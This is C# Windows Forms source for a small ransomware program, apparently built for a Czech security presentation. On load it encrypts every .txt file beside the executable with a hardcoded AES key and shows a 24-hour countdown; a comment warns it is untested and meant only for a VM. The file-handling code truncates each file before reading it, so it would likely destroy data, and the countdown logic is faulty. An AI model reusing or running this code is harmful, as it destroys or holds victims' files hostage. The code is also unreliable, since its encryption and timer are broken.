using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace rw2
{
    //JESTE JSEM TO NETESTOVAL A NEBUDU TO TESTOVAT DOKUD TO NEBUDU MIT VE VM, FAKT TO NETESTUJ BEZ TOHO!
    public partial class Form1 : Form
    {
        public int hours = 24, minutes = 0, seconds = 0;
        public Form1()
        {
            InitializeComponent();
        }
        
        public void encrypce()
        {
            string password = @"prezentaceKYB"; 
            UnicodeEncoding UE = new UnicodeEncoding();
            byte[] key = UE.GetBytes(password);
            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            filePath =filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
            string[] filePaths = Directory.GetFiles(filePath, "*.txt");

           
            foreach (string file in filePaths)
            {
                try
                {
                    string cryptFile = file;
                    FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);
                    RijndaelManaged RMCrypto = new RijndaelManaged();

                    CryptoStream cs = new CryptoStream(fsCrypt,
                        RMCrypto.CreateEncryptor(key, key),
                        CryptoStreamMode.Write);

                    FileStream fsIn = new FileStream(file, FileMode.Open);

                    int data;
                    while ((data = fsIn.ReadByte()) != -1)
                        cs.WriteByte((byte)data);


                    fsIn.Close();
                    cs.Close();
                    fsCrypt.Close();
                }
                catch
                {
                    MessageBox.Show("Failed");
                }
            }
        }
        public void dekrypce()
        {
            string password = @"prezentaceKYB";
            UnicodeEncoding UE = new UnicodeEncoding();
            byte[] key = UE.GetBytes(password);
            string filePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            filePath = filePath.Remove(filePath.Length - System.AppDomain.CurrentDomain.FriendlyName.Length);
            string[] filePaths = Directory.GetFiles(filePath, "*.txt");


            foreach (string file in filePaths)
            {
                try
                {
                    string cryptFile = file;

                    FileStream fsCrypt = new FileStream(file, FileMode.Open);

                    RijndaelManaged RMCrypto = new RijndaelManaged();

                    CryptoStream cs = new CryptoStream(fsCrypt,
                        RMCrypto.CreateDecryptor(key, key),
                        CryptoStreamMode.Read);

                    FileStream fsOut = new FileStream(file, FileMode.Create);

                    int data;
                    while ((data = cs.ReadByte()) != -1)
                        fsOut.WriteByte((byte)data);

                    fsOut.Close();
                    cs.Close();
                    fsCrypt.Close();
                }
                catch
                {
                    MessageBox.Show("Failed");
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            encrypce();
            timer1.Enabled = true;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            seconds--;
            if(seconds < 0)
            {
                minutes--;
                seconds = 59;
                if(minutes < 0)
                {
                    hours--;
                    minutes = 59;
                    if(hours == 0)
                    {
                        timer1.Enabled = false;
                        label1.Text = "Čas vypršel!";
                    }
                }
            }
            label1.Text = hours.ToString() + ":" + minutes.ToString() + ":" + seconds.ToString();
        }
    }
}
